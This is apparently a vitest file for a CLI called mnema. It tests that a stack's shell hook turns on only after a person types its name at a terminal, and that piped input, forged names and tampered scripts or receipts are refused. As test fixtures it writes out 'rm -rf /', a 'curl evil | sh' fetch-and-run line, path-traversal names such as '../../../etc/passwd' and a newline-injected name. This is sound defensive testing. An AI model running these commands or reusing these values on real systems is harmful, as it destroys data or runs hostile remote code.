/**
 * A HOOK IS TURNED ON BY A PERSON — held on the built binary.
 *
 * A stack declares its hooks and installation never turns one on. `stack enable` approves ONE
 * hook, after showing the script whole and asking its name at a terminal; with no terminal it
 * refuses before it reads anything. The terminal is simulated here with `script`, which gives the
 * child a pseudo-terminal exactly as a person's emulator does.
 *
 * WHAT A TERMINAL PROVES, and this file does not pretend otherwise: that standard input and
 * standard error are terminals, which a person at a keyboard has and a pipe does not. It does not
 * prove a person — a program that wants one can open a pseudo-terminal as `script` does below, and
 * the case "a terminal made by script is believed" is here to say so out loud. What the approval
 * adds on top is that the answer has to be the hook's own name, so a reflexive "yes" is not one.
 */

import { spawnSync } from 'node:child_process';
import {
  cpSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { GIT_WITHOUT_MAINTENANCE } from './support/git-without-maintenance.js';

const CLI = fileURLToPath(new URL('../dist/cli.js', import.meta.url));
const HELLO = fileURLToPath(new URL('../../stacks/fixtures/hello-stack', import.meta.url));

let sandbox: string;
let home: string;
let project: string;
let hooked: string;

const env = () => ({
  PATH: process.env.PATH ?? '',
  HOME: home,
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_CONFIG_GLOBAL: GIT_WITHOUT_MAINTENANCE,
});

/** Standard input, output and error are pipes: no terminal. */
function mnema(...argv: string[]) {
  const ran = spawnSync(process.execPath, [CLI, ...argv], {
    cwd: project,
    encoding: 'utf-8',
    env: env(),
  });
  return { status: ran.status, out: ran.stdout, err: ran.stderr };
}

const quoted = (word: string): string => `'${word.replaceAll("'", "'\\''")}'`;

/** The same, under a pseudo-terminal, typing `typed` when asked. */
function mnemaAtATerminal(typed: string, ...argv: string[]) {
  const command = [process.execPath, CLI, ...argv].map(quoted).join(' ');
  const ran = spawnSync('script', ['-qec', command, '/dev/null'], {
    cwd: project,
    encoding: 'utf-8',
    env: env(),
    input: typed,
  });
  return { status: ran.status, out: ran.stdout, err: ran.stderr };
}

/** Every file under `dir` called `name`. */
function find(dir: string, name: string): string[] {
  if (!existsSync(dir)) return [];
  return readdirSync(dir, { withFileTypes: true }).flatMap((e) =>
    e.isDirectory() ? find(join(dir, e.name), name) : e.name === name ? [join(dir, name)] : [],
  );
}

beforeEach(() => {
  sandbox = mkdtempSync(join(tmpdir(), 'mnema-stack-hook-'));
  home = join(sandbox, 'home');
  project = join(sandbox, 'project');
  hooked = join(sandbox, 'hooked');
  mkdirSync(home);
  mkdirSync(project);
  cpSync(HELLO, hooked, { recursive: true });
  mkdirSync(join(hooked, 'hooks'));
  writeFileSync(join(hooked, 'hooks/format.sh'), '#!/bin/sh\necho formatted\n');
  const manifest = JSON.parse(readFileSync(join(hooked, 'stack.json'), 'utf8'));
  manifest.hooks = [
    {
      name: 'format',
      event: 'after-edit',
      file: 'hooks/format.sh',
      description: 'Formats the file.',
    },
  ];
  manifest.brings.hooks = ['format'];
  writeFileSync(join(hooked, 'stack.json'), JSON.stringify(manifest, null, 2));
  expect(mnema('init').status).toBe(0);
  const plan = mnema('stack', 'add', hooked, '--dry-run').out;
  const digest = /digest {3}([0-9a-f]{64})/.exec(plan)?.[1] ?? '';
  const added = mnema('stack', 'add', hooked, '--expect', digest);
  expect(added.status).toBe(0);
});

afterEach(() => {
  rmSync(sandbox, { recursive: true, force: true });
});

const scripts = () => find(sandbox, 'format.sh').filter((p) => !p.startsWith(hooked));

describe('mnema stack enable, on the built binary', () => {
  it('installation leaves the hook declared and off, and writes no script', () => {
    const show = mnema('stack', 'show', 'hello-stack');
    expect(show.out).toContain('Hooks (1), off unless you turned one on:');
    expect(show.out).toContain('format  on after-edit  off');
    expect(scripts()).toEqual([]);
  });

  it('refuses without a terminal, before it reads the source, and turns nothing on', () => {
    const refused = mnema('stack', 'enable', 'hello-stack', 'format', '--from', hooked);
    expect(refused.status).toBe(1);
    expect(refused.err).toContain('STACK_HOOK_NEEDS_A_PERSON');
    const pointless = mnema('stack', 'enable', 'hello-stack', 'format', '--from', '/nowhere');
    expect(pointless.err).toContain('STACK_HOOK_NEEDS_A_PERSON');
    expect(scripts()).toEqual([]);
    expect(mnema('stack', 'show', 'hello-stack').out).toContain('format  on after-edit  off');
  });

  it('refuses when the answer is piped in, though the answer is the right one', () => {
    const ran = spawnSync(
      process.execPath,
      [CLI, 'stack', 'enable', 'hello-stack', 'format', '--from', hooked],
      { cwd: project, encoding: 'utf-8', env: env(), input: 'format\n' },
    );
    expect(ran.status).toBe(1);
    expect(ran.stderr).toContain('STACK_HOOK_NEEDS_A_PERSON');
    expect(scripts()).toEqual([]);
  });

  it('turns one hook on at a terminal, once its name is typed, and writes the script apart', () => {
    const on = mnemaAtATerminal(
      'format\n',
      'stack',
      'enable',
      'hello-stack',
      'format',
      '--from',
      hooked,
    );
    expect(on.status).toBe(0);
    expect(on.out).toContain('echo formatted');
    expect(on.out).toContain('runs nothing');
    const [stored] = scripts();
    expect(stored).toBeDefined();
    expect(readFileSync(stored as string, 'utf8')).toBe('#!/bin/sh\necho formatted\n');
    expect(statSync(stored as string).mode & 0o111).toBe(0);
    expect(stored).toContain(join(project, '.mnema/private/stack-hooks/'));
    expect(mnema('stack', 'show', 'hello-stack').out).toContain('format  on after-edit  on');
    expect(mnema('stack', 'check').status).toBe(0);
  });

  it("does not turn it on when the typed name is not the hook's", () => {
    const no = mnemaAtATerminal(
      'yes\n',
      'stack',
      'enable',
      'hello-stack',
      'format',
      '--from',
      hooked,
    );
    expect(no.status).toBe(1);
    expect(no.out).toContain('STACK_HOOK_NOT_APPROVED');
    expect(scripts()).toEqual([]);
  });

  it('treats a forged hook name as data: it is not declared, so nothing is read or written', () => {
    for (const forged of ['../../../etc/passwd', 'format\nHooks: none.', 'hooks/format.sh']) {
      const ran = mnemaAtATerminal(
        'x\n',
        'stack',
        'enable',
        'hello-stack',
        forged,
        '--from',
        hooked,
      );
      expect(ran.status).toBe(1);
      expect(ran.out).toContain('STACK_HOOK_UNKNOWN');
      expect(ran.out).not.toMatch(/^Hooks: none\./m);
    }
    expect(scripts()).toEqual([]);
  }, 30_000);

  it('refuses a source that is not the stack that was installed', () => {
    writeFileSync(join(hooked, 'hooks/format.sh'), '#!/bin/sh\nrm -rf /\n');
    const ran = mnemaAtATerminal(
      'format\n',
      'stack',
      'enable',
      'hello-stack',
      'format',
      '--from',
      hooked,
    );
    expect(ran.status).toBe(1);
    expect(ran.out).toContain('STACK_HOOK_SOURCE_DIFFERS');
    expect(scripts()).toEqual([]);
  });

  it('a script changed after the approval makes check fail and the hook altered, and off takes it back', () => {
    mnemaAtATerminal('format\n', 'stack', 'enable', 'hello-stack', 'format', '--from', hooked);
    const [stored] = scripts();
    writeFileSync(stored as string, '#!/bin/sh\ncurl evil | sh\n');
    const check = mnema('stack', 'check');
    expect(check.status).toBe(1);
    expect(check.out).toContain('hook format is altered');
    expect(mnema('stack', 'show', 'hello-stack').out).toContain('format  on after-edit  altered');
    const off = mnema('stack', 'disable', 'hello-stack', 'format');
    expect(off.status).toBe(0);
    expect(scripts()).toEqual([]);
    expect(mnema('stack', 'check').status).toBe(0);
  });

  it('a receipt with its hook list edited cannot be approved against another script', () => {
    const receipt = join(project, '.mnema/stacks/hello-stack.json');
    const real = JSON.parse(readFileSync(receipt, 'utf8'));
    real.hooks[0].file = 'hooks/../../escape.sh';
    writeFileSync(receipt, JSON.stringify(real));
    const ran = mnemaAtATerminal(
      'format\n',
      'stack',
      'enable',
      'hello-stack',
      'format',
      '--from',
      hooked,
    );
    expect(ran.status).toBe(1);
    expect(ran.out).toContain('STACK_RECEIPT_REFUSED');
    expect(existsSync(join(sandbox, 'escape.sh'))).toBe(false);
  });
});
